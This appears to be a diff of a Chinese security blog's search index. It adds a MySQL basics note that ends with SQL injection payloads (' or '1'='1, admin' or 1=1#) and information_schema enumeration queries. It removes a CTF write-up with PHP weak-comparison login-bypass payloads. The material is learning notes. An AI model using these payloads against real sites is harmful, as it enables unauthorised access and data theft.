@@ -1,6 +1,337 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>数据库基础</title>
+    <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
+数据库层级结构（类比学校）
+
+
+
+层级
+类比
+示例
+
+
+
+顶层：数据库
+整个学校
+school 库（存储校园所有数据）
+
+
+中层：数据表
+学校不同部门
+users 表、classes 表
+
+
+底层：字段+数据
+表头+行内容
+字段：id、name，数据：2025001、张三
+
+
+1.2 数据库管理系统（DBMS）数据库的”管家”，负责管理数据访问、存储规则，常见类型：
+
+Oracle：功能强、收费，银行&#x2F;电信常用
+SQL Server：适配Windows，政府单位常用
+MySQL：开源免费、轻巧，校园系统&#x2F;网站主流
+
+
+2. 数据库连接操作2.1 Navicat 可视化连接
+打开 Navicat → 左上角「连接」→ 选择「MySQL」
+填写核心信息：
+主机：localhost（本地数据库）
+端口：3306（MySQL 默认端口）
+用户名：root（超级管理员）
+密码：安装 MySQL 时设置的密码
+
+
+点击「测试连接」，提示”连接成功”即完成
+双击连接名，即可查看&#x2F;操作数据库
+
+2.2 命令行连接mysql -u root -p
+
+
+-u：指定用户名
+-p：需要输入密码（输入时不显示，属正常现象）
+回车后输入密码，再次回车即可登录
+
+
+3. 基础信息查询-- 当前数据库SELECT DATABASE();-- 数据库版本SELECT VERSION();
+
+
+4. DDL 库与表定义4.1 数据库操作SHOW DATABASES;                -- 查看所有库USE 数据库名;                   -- 切换数据库CREATE DATABASE 库名;           -- 创建库DROP DATABASE 库名;             -- 删除库
+
+创建 school 数据库（指定字符集）CREATE DATABASE school CHARACTER SET utf8 COLLATE utf8_general_ci;
+
+
+CHARACTER SET：指定字符集
+COLLATE：指定排序规则
+
+4.2 数据表操作SHOW TABLES;                    -- 查看当前库所有表DESC 表名;                      -- 查看表结构CREATE TABLE 表名(字段 类型…);   -- 创建表DROP TABLE 表名;                -- 删除表
+
+创建 users 学生表USE school;CREATE TABLE users (    id INT(11) PRIMARY KEY,            -- 主键，学号（唯一标识）    name VARCHAR(50) NOT NULL,         -- 姓名，非空    id_card VARCHAR(18) NOT NULL,      -- 身份证号    phone VARCHAR(11) NOT NULL,        -- 手机号    address TEXT,                       -- 地址    password VARCHAR(255) NOT NULL     -- 密码);
+
+
+5. DML 数据操作（增删改查）5.1 插入 INSERTINSERT INTO `school`.`users` (`id`, `name`, `id_card`, `phone`, `address`, `password`)VALUES (3, &#x27;shiro&#x27;, &#x27;123456789&#x27;, &#x27;123456789&#x27;, &#x27;中国&#x27;, &#x27;123456&#x27;);
+
+
+INSERT INTO 表名(字段1, 字段2)：指定新增数据的表和字段
+VALUES(值1, 值2)：批量填数据，顺序与字段对应
+
+5.2 查询 SELECT-- 查所有列SELECT * FROM 表名;-- 查指定列SELECT 字段1, 字段2 FROM 表名;-- 按条件查询SELECT name, password FROM users WHERE id = 1;-- 去重SELECT DISTINCT 字段 FROM 表名;-- 排序（ASC 升序默认 / DESC 降序）SELECT name FROM users ORDER BY id;SELECT name FROM users ORDER BY name DESC;-- 分页（从 n 开始取 m 条）SELECT * FROM users LIMIT 3;SELECT * FROM users LIMIT 1, 2;
+
+5.3 修改 UPDATEUPDATE users SET password = &#x27;newpass789&#x27; WHERE id = 2;
+
+注意：漏写 WHERE 会修改表中所有数据。
+5.4 删除 DELETEDELETE FROM users WHERE id = 1;
+
+同样，漏写 WHERE 会清空整张表，且难以恢复。
+
+6. 常用条件语法6.1 运算符
+
+
+类型
+语法
+说明
+
+
+
+比较
+= &gt; &lt; &gt;= &lt;= !=
+值比较
+
+
+逻辑
+AND OR NOT
+条件组合
+
+
+范围
+BETWEEN 小 AND 大
+区间筛选
+
+
+集合
+IN(值1, 值2)
+多值匹配
+
+
+AND（并且）：多个条件必须同时满足SELECT name, password FROM users WHERE id = 2 AND name = &#x27;xiaolin&#x27;;
+
+OR（或者）：满足任一条件即可SELECT * FROM users WHERE id = 2 OR id = 3;
+
+6.2 模糊查询LIKE &#x27;%字符%&#x27;  -- % 匹配任意多个字符LIKE &#x27;_字符_&#x27;  -- _ 匹配单个字符-- 示例SELECT * FROM users WHERE name LIKE &#x27;x%&#x27;;   -- 查姓 x 的学生
+
+
+7. 聚合函数（统计）
+
+
+函数
+作用
+
+
+
+COUNT()
+统计行数
+
+
+MAX()
+最大值
+
+
+MIN()
+最小值
+
+
+SUM()
+求和
+
+
+AVG()
+平均值
+
+
+
+8. 分组与筛选GROUP BY 字段;          -- 分组HAVING 条件;            -- 分组后条件过滤
+
+
+9. 查询9.1 多表连接查询9.1.1 内连接 INNER JOIN只保留两边匹配数据
+-- 三表关联示例select a.userno,a.username,b.lessonname,c.scorefrom userinfo ainner join score c on a.userno = c.usernoinner join lesson b on c.lessonno = b.lessonno;
+
+特点：只返回两表关联条件匹配成功的行，无匹配数据全部过滤。
+9.1.2 右外连接 RIGHT JOIN右表全部保留，左表无匹配填NULL
+select b.userno, a.username, b.numfrom userinfo aright join signin bon a.userno = b.userno;
+
+执行结果说明：
+
+signin 表所有数据全部展示；
+userinfo 中不存在的用户，username 字段显示 NULL。
+
+9.1.3 左外连接 LEFT JOIN左表全部保留，右表无匹配填NULL
+select a.userno, a.username, b.numfrom userinfo aleft join signin bon a.userno = b.userno;
+
+9.1.4 连接规则
+必须使用 on 写关联条件，区分 where 过滤条件；
+多表关联时建议给表起别名简化书写；
+区分内外连接：内连接只留交集，外连接保留单侧全量数据。
+
+9.2 UNION 联合查询多条查询结果纵向合并
+9.2.1 基础语法-- UNION：自动去除重复行select 列1,列2 from 表1UNIONselect 列1,列2 from 表2;-- UNION ALL：直接拼接，不去重，性能更高select 列1,列2 from 表1UNION ALLselect 列1,列2 from 表2;
+
+注意：
+
+列数量必须完全一致：前后两条select查询返回的字段个数相同；
+对应位置字段数据类型兼容：第1列都是字符串、第2列都是数字，不能一列字符串一列数字；
+最终字段名以第一条select的列名为准；
+排序写法：order by 写在整条语句末尾，作用于合并后的全部结果
+
+select userno,username from userinfoUNION ALLselect userno,&#x27;&#x27; from signinorder by userno asc;
+
+9.2.2 UNION vs UNION ALL
+
+
+关键字
+去重
+性能
+使用场景
+
+
+
+UNION
+自动剔除完全重复数据
+低（底层排序比对去重）
+需要合并后剔除重复数据
+
+
+UNION ALL
+保留所有数据，不做去重
+高（直接拼接结果）
+确认无重复，追求查询速度
+
+
+9.3 连接查询 vs UNION
+JOIN（左右内连接）：横向拼接多张表按关联条件左右合并字段，一行数据同时包含多表列；例：用户表+签到表，一行同时有用户名、签到次数。
+UNION：纵向拼接多条查询结果上下合并行，字段结构完全一致，只是叠加数据；例：把1班学生表、2班学生表合成一张完整学生列表。
+示例：
+
+-- 左连接结果 + 右连接结果 合并select a.userno,a.username,b.num from userinfo a left join signin b on a.userno=b.usernoUNIONselect b.userno,a.username,b.num from userinfo a right join signin b on a.userno=b.userno;
+
+
+10. SQL 注入漏洞10.1 万能密码漏洞根源$sql = &quot;SELECT * FROM users WHERE name=&#x27;$name&#x27; AND password=&#x27;$pwd&#x27;&quot;;
+
+
+直接将用户输入拼接到 SQL 语句的单引号中执行
+未检查&#x2F;过滤特殊字符（如 &#39;、OR、# 等），也未做转义处理
+攻击者可输入恶意字符篡改 SQL 逻辑
+
+攻击原理攻击者输入 123&#39; or &#39;1&#39;=&#39;1，实现 3 个关键操作：
+
+闭合原有 SQL 语句的单引号，打破查询限制
+添加 &#39;1&#39;=&#39;1&#39; 恒成立条件，让查询条件永远为真
+注释多余内容，避免 SQL 语法错误
+
+篡改后的 SQL 对比原正常 SQL：
+SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27;
+
+篡改后 SQL：
+SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;123&#x27; or &#x27;1&#x27;=&#x27;1&#x27;
+
+无论账号密码是否正确，数据库都会返回所有用户信息，实现免密绕过。
+SELECT * FROM users WHERE name=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;123&#x27;
+
+10.2 CTF 注入常用语句核心系统库：information_schemaMySQL 自带系统字典库，储存所有数据库名、表名、字段名，注入查表必备。
+
+
+
+系统表
+存储内容
+
+
+
+schemata
+所有数据库信息
+
+
+tables
+所有数据表信息
+
+
+columns
+所有字段（列）信息
+
+
+
+
+
+关键字段
+含义
+
+
+
+schema_name
+数据库名
+
+
+table_schema
+表所属的数据库
+
+
+table_name
+数据表名
+
+
+column_name
+字段（列）名
+
+
+常用注入语句
+查看当前库、版本
+
+SELECT DATABASE();SELECT VERSION();
+
+
+查询所有数据库
+
+SELECT schema_name FROM information_schema.schemata;
+
+
+查询当前库所有表
+
+SELECT table_name FROM information_schema.tables WHERE table_schema = database();
+
+
+查询指定表所有字段
+
+SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
+
+
+探测字段数量
+
+ORDER BY 1;ORDER BY 2;-- 不报错代表存在，报错即为最大列数
+
+
+批量拼接爆库&#x2F;表&#x2F;字段
+
+-- 爆出当前库所有表SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database();-- 爆出指定表所有字段SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;表名&#x27;;
+
+
+查询表内真实数据
+
+SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
+
+
+本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MSF的使用以及漏洞复现</title>
     <url>/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
     <content><![CDATA[一、MSF 是什么？1. 基础概述定义：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
@@ -611,7 +942,7 @@ run vnc         # 开启VNC远程桌面控制
     <url>/2026/05/19/hello-world/</url>
     <content><![CDATA[
   
-    0d0c4d678e757831306700e6db750883433a1e75179a6babe5cd6357344581cf16cebcda15297b014fef0d711009b655519642aafca405243b33705feedf6c8f8b6c74d15fc1d6cd2eaf4536aa7f48de5abeb8f6a4085a3a40f4d2ae1bd9ab9bc060f3a3ad7ccbbcf9f96c51225787df7a30b2996d3b7178222e3fec2c200267f3a7343c55d322f38d967567e5d8dbbf025beca630374e1882b870a7c5e10c033b66287c199ed866d9da11fa3c8483c3b2a406cbc55d2c9a8368285a59aea61f0500f4cfda4bae26e8e433d8773ac006e376998ac85af6212184239a97c3c6bed1c963e0d45ada7fce7be59081044516acfe6a48ac5c08ccd70976774f93e0f2396743d55802bafb6a582011a61cdbb8b0b89fe01389ce073be66d0b0677e1af7554c60ab1a078aed5340cbac5c27249245e67b143b50b38b7bdd9c009cb506aace5fc5511ac1ae594d8cb567cb102f3560ff8e6f041bb0b2b300bb18ab90048eeb77358bda26e82f53d22142c8a71136596a43d8f3457a00d1945567ef26ef9a9f3c932da46c7738edab66092d9fbe42ec794d43df541b5e2a7062528c4080d7c7d3de510f34b512e158a396eed
+    5f20db2b60167da3ffe80dac92eab1aa2459628c9f9f8321f48c9c030977871a09f5ac8fcf7254db6a1f7b796f3f46df97eb5dfd23c4fd5358e3eab30e9d23b0332488081b5db0881bd54f919dd6783bf85b2dbdcd602e078efb6036953a296e11ce2ca4905c02f4f68868cf21c4393d2ad6aef82b97d19207a574b2253bd01a8e8e9dcebcf94c12ae45433c6d8c3e45ed7f19f260c4b9d6a12d0eef6bf37823f50fd752351527a3bc3fc99a70ea9b55a6952df409c1b327ae131e3fcbdb6bd1e0c61db93f59fc7bf4286fa909c439ba04cd60173bef59c94e25d272fa21458d558f504ac1dcf1d73ef25753f57c46e7f93232a75f401859e5fb26d28f11740080804550544538234bc88e9f4570732dbe33c257a58ee8b122780b8414399b8d7b73856a0d1474d7a6e9ab15002bdf6a2de5c0f7e682e2ec3e59314f7d1f20e83bbd5c42cb00098a4a998d86fa9fece107c2d5dcd9d9f0b21cf8f0bd2b1c2b3a1c1b5954e4753a71ce83a6e7c3f7dac8dbc9254a932d76337f2adaac35806ade32d53ec7dbae5bfee25a249346ab9fe0c6f286a00f58874537d0190b3f0e98f22d6704e92bc46a5d87bb3eb6c0ce
   
   
     
@@ -1302,594 +1633,6 @@ ysoserial 把这条链封装好，你只需要输入要执行的命令，工具�
       </tags>
   </entry>
   <entry>
-    <title>PHP特性利用之弱比较</title>
-    <url>/2026/06/23/PHP%E5%BC%B1%E6%AF%94%E8%BE%83/index/</url>
-    <content><![CDATA[一、前置知识：1. 基础概念区分
-== 弱比较PHP会自动隐式转换两边数据类型后再对比，是所有CTF弱类型题的核心漏洞点。
-=== 强比较同时校验值 + 数据类型，不做任何自动转换，无法用弱类型绕过，是标准防御写法。
-
-
-2. 绕过方法2.1 0e MD5 科学计数法绕过
-原理
-
-
-以 0e 开头且后续全为纯数字的字符串，在进行弱比较（==）时，会被 PHP 强制解析为科学计数法 0 × 10&lt;sup&gt;n&lt;/sup&gt;= 0。因此，任意两个满足此格式的字符串 == 判定恒为 true。
-示例：
-
-$a = md5(&#x27;240610708&#x27;); // 0e462097431906509019562988736854$b = md5(&#x27;QNKCDZO&#x27;);   // 0e830400458393240665909944582762var_dump($a == $b); // truevar_dump($a === $b);// false
-
-
-适用场景：后端使用弱比较判断两个不同输入的 MD5 或 SHA1 值是否相等。
-
-
-2.2 数字字符串截断匹配
-原理(PHP 8 之前)
-
-
-字符串和数字进行弱对比时，PHP 会从字符串开头提取数字，后面的字母直接丢弃。如果开头没有数字，则直接转为 0。字符串和数字==对比时，会从字符串开头提取数字，后面字符直接丢弃。
-示例
-
-var_dump(123 == &quot;123abc&quot;);  // truevar_dump(0 == &quot;abc123&quot;);    // true，无开头数字直接转为0var_dump(0 == &quot;flag&quot;);     // true
-
-
-注意：PHP 8 此特性已废弃。PHP 8 会将数字转为字符串再比较，0 &#x3D;&#x3D; “flag” 的结果变为 false。 
-适用场景：要求传入的参数等于某个特定数字，传入“数字+字母”或“字母”触发隐式转换绕过（仅限 PHP 7 及以下）。
-
-
-2.3 ffifdyop MD5 SQL注入绕过$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
-
-
-原理
-
-
-当后端使用 md5($password, true) 时，第二个参数 true 会让函数返回 16 字节的原始二进制格式，而不是 32 位的十六进制字符串。
-
-
-利用方式
-
-
-明文 ffifdyop 的 MD5 二进制数据中，恰好包含字符串 ‘or’6。拼接到 SQL 语句。
-拼接前：
-
-
-
-select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27; 
-
-- 拼接后：	
-
-select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6...&#x27; 
-
-这闭合了单引号，并形成了 or 6 的永真条件，直接绕过登录验证。我在 PHP特性利用之 MD5 这篇中有提到这种题目。
-
-2.4 数组绕过数组和字符串直接比较 [] &#x3D;&#x3D; “admin” 结果是 false。真正的漏洞在于 PHP 的内置处理函数。 
-
-利用方式
-
-
-md5()、sha1()、strcmp() 等函数期望接收字符串。如果传入数组（如：pass[]&#x3D;1），函数无法处理会报错并返回 null。 
-示例 1 (弱比较绕过)
-
-strcmp($pass, &quot;admin&quot;) == 0
-
-传入数组后函数返回 null，随后 null &#x3D;&#x3D; 0 判定为 true，成功绕过。 
-
-示例 2 (强比较绕过)
-
-$a !== $bmd5($a) === md5($b)
-
-传入两个不同的数组，哈希函数均返回 null，随后 null &#x3D;&#x3D;&#x3D; null 判定为 true，成功绕过。 
-
-注意：在 PHP 8 中，向这类函数传入数组不再返回 null，而是直接抛出 TypeError 致命错误导致程序崩溃，该方法失效。
-
-
-3. 总结通用类型转换规则：
-
-数字与字符串： PHP 8 之前：字符串转数字（从头截取，无数字转0）。 PHP 8 及以后：数字转字符串比较。
-0e 规则： 0e开头纯数字 &#x3D;&#x3D; 0e开头纯数字，结果恒为 true。
-数组特性： 数组与任意数字或字符串直接弱比较，结果为 false。 数组传入 md5 或 strcmp 等仅接收字符串的函数，返回 null (PHP 8 之前) 或直接报错 (PHP 8 及以后)。
-null &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “” 互相弱比较全为 true。 注意：PHP 8 中 0 &#x3D;&#x3D; “” 的结果变为 false。
-
-
-二、[攻防世界] simple_php1. 题目
-
-2. 解题思路
-读代码
-
-&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a = @$_GET[&#x27;a&#x27;];$b = @$_GET[&#x27;b&#x27;];if ($a == 0 and$a) &#123;    echo$flag1;&#125;if (is_numeric($b)) &#123;    exit();&#125;if ($b &gt; 1234) &#123;    echo$flag2;&#125;?&gt;
-
-
-$a 的要求：弱等于 0，但又不能是 0 或空值（比如 0a、abc）。
-$b 的要求：不能是纯数字&#x2F;数字字符串，但弱比较要大于 1234（比如 1235a）。
-
-
-构造Payload如?a=0a&amp;b=1235a即可同时获取flag1和flag2
-
-
-三、[攻防世界] PHP21. 题目
-2. 解题思路
-这句话 “Can you authenticate to this website?” 的意思是：“你能通过这个网站的身份验证吗？” 或 “你能登录&#x2F;认证到这个网站吗？”
-
-
-这个页面没有提供登录框、输入框等明显的交互方式，说明认证逻辑藏在代码或请求里，需要去挖掘。
-需要找到绕过身份验证的方法，比如：
-查看页面源码或备份文件
-分析隐藏的参数或 Cookie
-利用编码、弱类型等漏洞
-
-
-
-
-由于题目的标题是PHP，所以我们试一下index.php  或者  index.phps
-读代码
-
-&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123;    echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);    exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123;    echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;    echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt;
-
-
-=== 强比较：禁止直接传入 id=admin。
-代码对 id 进行了第二次 URL 解码，我们可以利用这一点。
-绕过思路：对 &quot;admin&quot; 进行 两次 URL 编码，让浏览器第一次解码后不等于 &quot;admin&quot;，通过第一层判断；代码第二次解码后得到 &quot;admin&quot;，触发第二层判断。
-
-
-用bp，对 admin 进行两次 URL 编码
-
-
-得到：
-%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
-
-
-构造 payload：
-
-?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
-
-
-成功绕过认证，获取 Flag
-
-
-四、[Bugku CTF] 各种绕过哟1. 题目：2. 解题思路
-代码审计
-
-&lt;?phphighlight_file(&#x27;flag.php&#x27;);$id = urldecode($_GET[&#x27;id&#x27;]);$flag = &#x27;flag(xxxxxxxxxxxxxxx)&#x27;;if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123;    if ($_GET[&#x27;uname&#x27;] ==$_POST[&#x27;passwd&#x27;]) &#123;        print &#x27;passwd can not be uname.&#x27;;    &#125;    else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;]) &amp;&amp; ($id==&#x27;margin&#x27;)) &#123;        die(&#x27;Flag:&#x27;.$flag);     &#125;    else &#123;        print &#x27;sorry!&#x27;;    &#125;&#125;?&gt;
-
-
-GET传 uname 和 id；
-POST传 passwd；
-需满足的条件：
-$_GET[&#39;uname&#39;] !=$_POST[&#39;passwd&#39;] 
-sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])（SHA1强相等）；
-$id = urldecode($_GET[&#39;id&#39;]);并且$id==&#39;margin&#39;
-
-
-
-
-分析条件
-
-
-PHP的sha1()函数只接受字符串&#x2F;数字，传入数组会返回NULL；要求SHA1值必须强相等，那么传入两个不同的数组（比如uname[]=1和passwd[]=2）满足uname != passwd
-id直接传margin，源码没有 if($id == &#39;margin&#39;) 这类校验逻辑，不存在匹配拦截，所以不需要二次 URL 编码绕过。
-
-3. 解题步骤
-代码审计，读懂代码，找到漏洞
-要满足拿到flag的三个条件
-给 GET 的uname传数组：uname[]=1 → sha1(uname) = NULL；
-
-给 POST 的passwd传数组：passwd[]=2 → sha1(passwd) = NULL；
-id直接传margin
-
-开发者工具→hackbar
-或者用bp
-
-
-**请求方式改为 ****POST**
-POST /?id=margin&amp;uname[]=1 HTTP/1.1
-
-
-
-五、[Bugku CTF] 矛盾1. 题目2. 解题思路
-代码分析
-
-$num = $_GET[&#x27;num&#x27;];if(!is_numeric($num))  &#123;    echo $num;    if($num==1)      echo &#x27;flag&#123;*********&#125;&#x27;;&#125;
-
-
-is_numeric() 的官方定义是：专门用来检测变量是否为数字或纯数字字符串
-条件1：!is_numeric($num) 要求 num 的值不能是数字或数字字符串
-条件2：$num==1 要求 num 在弱比较中等于 1。
-
-
-绕过：传值 1+除数字之外的
-
-我们需要传一个不是数字类型，但弱比较等于1的值。
-
-
-六、[MRCTF2020]Ez_bypass1. 题目
-2. 解题思路
-查看源码
-
-
-
-代码分析
-
-md5($id) === md5($gg) &amp;&amp; $id !== $gg
-
-要让 $id 和 $gg 的 MD5 哈希值完全一样，但 $id 和 $gg 本身的内容必须不同。
-数组绕过：给 $id 和 $gg 传不同的数组
-
-!is_numeric($passwd) &amp;&amp; $passwd == 1234567
-
-传入的 passwd 不能是「纯数字」（is_numeric 返回 false），但用弱类型比较时，它又要等于数字 1234567。
-
-
-构造payload
-
-GET 部分
-?gg[]=1&amp;id[]=2
-
-POST 部分
-passwd=1234567a
-
-
-
-得到flag
-
-
-
-七、[CTFShow]web111. 题目
-2. 解题思路
-分析代码
-
-
-弱类型比较：最终使用 == 弱类型比较密码与 $_SESSION[&#39;password&#39;]
-绕过思路：$_SESSION[&#39;password&#39;]和$password为空。简单说就是，删除 PHPSESSID 强制服务器生成未初始化的空 Session（其值为 NULL），并传入空字符串密码（&quot;&quot;），利用 PHP 底层 &quot;&quot; == NULL 恒为真的弱比较漏洞，成功绕过了登录验证。
-
-
-bp抓包修改。
-
-
-
-
-得到flag
-
-]]></content>
-      <categories>
-        <category>CTF-WP</category>
-        <category>Lab-WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据库基础</title>
-    <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
-数据库层级结构（类比学校）
-
-
-
-层级
-类比
-示例
-
-
-
-顶层：数据库
-整个学校
-school 库（存储校园所有数据）
-
-
-中层：数据表
-学校不同部门
-users 表、classes 表
-
-
-底层：字段+数据
-表头+行内容
-字段：id、name，数据：2025001、张三
-
-
-1.2 数据库管理系统（DBMS）数据库的”管家”，负责管理数据访问、存储规则，常见类型：
-
-Oracle：功能强、收费，银行&#x2F;电信常用
-SQL Server：适配Windows，政府单位常用
-MySQL：开源免费、轻巧，校园系统&#x2F;网站主流
-
-
-2. 数据库连接操作2.1 Navicat 可视化连接
-打开 Navicat → 左上角「连接」→ 选择「MySQL」
-填写核心信息：
-主机：localhost（本地数据库）
-端口：3306（MySQL 默认端口）
-用户名：root（超级管理员）
-密码：安装 MySQL 时设置的密码
-
-
-点击「测试连接」，提示”连接成功”即完成
-双击连接名，即可查看&#x2F;操作数据库
-
-2.2 命令行连接mysql -u root -p
-
-
--u：指定用户名
--p：需要输入密码（输入时不显示，属正常现象）
-回车后输入密码，再次回车即可登录
-
-
-3. 基础信息查询-- 当前数据库SELECT DATABASE();-- 数据库版本SELECT VERSION();
-
-
-4. DDL 库与表定义4.1 数据库操作SHOW DATABASES;                -- 查看所有库USE 数据库名;                   -- 切换数据库CREATE DATABASE 库名;           -- 创建库DROP DATABASE 库名;             -- 删除库
-
-创建 school 数据库（指定字符集）CREATE DATABASE school CHARACTER SET utf8 COLLATE utf8_general_ci;
-
-
-CHARACTER SET：指定字符集
-COLLATE：指定排序规则
-
-4.2 数据表操作SHOW TABLES;                    -- 查看当前库所有表DESC 表名;                      -- 查看表结构CREATE TABLE 表名(字段 类型…);   -- 创建表DROP TABLE 表名;                -- 删除表
-
-创建 users 学生表USE school;CREATE TABLE users (    id INT(11) PRIMARY KEY,            -- 主键，学号（唯一标识）    name VARCHAR(50) NOT NULL,         -- 姓名，非空    id_card VARCHAR(18) NOT NULL,      -- 身份证号    phone VARCHAR(11) NOT NULL,        -- 手机号    address TEXT,                       -- 地址    password VARCHAR(255) NOT NULL     -- 密码);
-
-
-5. DML 数据操作（增删改查）5.1 插入 INSERTINSERT INTO `school`.`users` (`id`, `name`, `id_card`, `phone`, `address`, `password`)VALUES (3, &#x27;shiro&#x27;, &#x27;123456789&#x27;, &#x27;123456789&#x27;, &#x27;中国&#x27;, &#x27;123456&#x27;);
-
-
-INSERT INTO 表名(字段1, 字段2)：指定新增数据的表和字段
-VALUES(值1, 值2)：批量填数据，顺序与字段对应
-
-5.2 查询 SELECT-- 查所有列SELECT * FROM 表名;-- 查指定列SELECT 字段1, 字段2 FROM 表名;-- 按条件查询SELECT name, password FROM users WHERE id = 1;-- 去重SELECT DISTINCT 字段 FROM 表名;-- 排序（ASC 升序默认 / DESC 降序）SELECT name FROM users ORDER BY id;SELECT name FROM users ORDER BY name DESC;-- 分页（从 n 开始取 m 条）SELECT * FROM users LIMIT 3;SELECT * FROM users LIMIT 1, 2;
-
-5.3 修改 UPDATEUPDATE users SET password = &#x27;newpass789&#x27; WHERE id = 2;
-
-注意：漏写 WHERE 会修改表中所有数据。
-5.4 删除 DELETEDELETE FROM users WHERE id = 1;
-
-同样，漏写 WHERE 会清空整张表，且难以恢复。
-
-6. 常用条件语法6.1 运算符
-
-
-类型
-语法
-说明
-
-
-
-比较
-= &gt; &lt; &gt;= &lt;= !=
-值比较
-
-
-逻辑
-AND OR NOT
-条件组合
-
-
-范围
-BETWEEN 小 AND 大
-区间筛选
-
-
-集合
-IN(值1, 值2)
-多值匹配
-
-
-AND（并且）：多个条件必须同时满足SELECT name, password FROM users WHERE id = 2 AND name = &#x27;xiaolin&#x27;;
-
-OR（或者）：满足任一条件即可SELECT * FROM users WHERE id = 2 OR id = 3;
-
-6.2 模糊查询LIKE &#x27;%字符%&#x27;  -- % 匹配任意多个字符LIKE &#x27;_字符_&#x27;  -- _ 匹配单个字符-- 示例SELECT * FROM users WHERE name LIKE &#x27;x%&#x27;;   -- 查姓 x 的学生
-
-
-7. 聚合函数（统计）
-
-
-函数
-作用
-
-
-
-COUNT()
-统计行数
-
-
-MAX()
-最大值
-
-
-MIN()
-最小值
-
-
-SUM()
-求和
-
-
-AVG()
-平均值
-
-
-
-8. 分组与筛选GROUP BY 字段;          -- 分组HAVING 条件;            -- 分组后条件过滤
-
-
-9. 查询9.1 多表连接查询9.1.1 内连接 INNER JOIN只保留两边匹配数据
--- 三表关联示例select a.userno,a.username,b.lessonname,c.scorefrom userinfo ainner join score c on a.userno = c.usernoinner join lesson b on c.lessonno = b.lessonno;
-
-特点：只返回两表关联条件匹配成功的行，无匹配数据全部过滤。
-9.1.2 右外连接 RIGHT JOIN右表全部保留，左表无匹配填NULL
-select b.userno, a.username, b.numfrom userinfo aright join signin bon a.userno = b.userno;
-
-执行结果说明：
-
-signin 表所有数据全部展示；
-userinfo 中不存在的用户，username 字段显示 NULL。
-
-9.1.3 左外连接 LEFT JOIN左表全部保留，右表无匹配填NULL
-select a.userno, a.username, b.numfrom userinfo aleft join signin bon a.userno = b.userno;
-
-9.1.4 连接规则
-必须使用 on 写关联条件，区分 where 过滤条件；
-多表关联时建议给表起别名简化书写；
-区分内外连接：内连接只留交集，外连接保留单侧全量数据。
-
-9.2 UNION 联合查询多条查询结果纵向合并
-9.2.1 基础语法-- UNION：自动去除重复行select 列1,列2 from 表1UNIONselect 列1,列2 from 表2;-- UNION ALL：直接拼接，不去重，性能更高select 列1,列2 from 表1UNION ALLselect 列1,列2 from 表2;
-
-注意：
-
-列数量必须完全一致：前后两条select查询返回的字段个数相同；
-对应位置字段数据类型兼容：第1列都是字符串、第2列都是数字，不能一列字符串一列数字；
-最终字段名以第一条select的列名为准；
-排序写法：order by 写在整条语句末尾，作用于合并后的全部结果
-
-select userno,username from userinfoUNION ALLselect userno,&#x27;&#x27; from signinorder by userno asc;
-
-9.2.2 UNION vs UNION ALL
-
-
-关键字
-去重
-性能
-使用场景
-
-
-
-UNION
-自动剔除完全重复数据
-低（底层排序比对去重）
-需要合并后剔除重复数据
-
-
-UNION ALL
-保留所有数据，不做去重
-高（直接拼接结果）
-确认无重复，追求查询速度
-
-
-9.3 连接查询 vs UNION
-JOIN（左右内连接）：横向拼接多张表按关联条件左右合并字段，一行数据同时包含多表列；例：用户表+签到表，一行同时有用户名、签到次数。
-UNION：纵向拼接多条查询结果上下合并行，字段结构完全一致，只是叠加数据；例：把1班学生表、2班学生表合成一张完整学生列表。
-示例：
-
--- 左连接结果 + 右连接结果 合并select a.userno,a.username,b.num from userinfo a left join signin b on a.userno=b.usernoUNIONselect b.userno,a.username,b.num from userinfo a right join signin b on a.userno=b.userno;
-
-
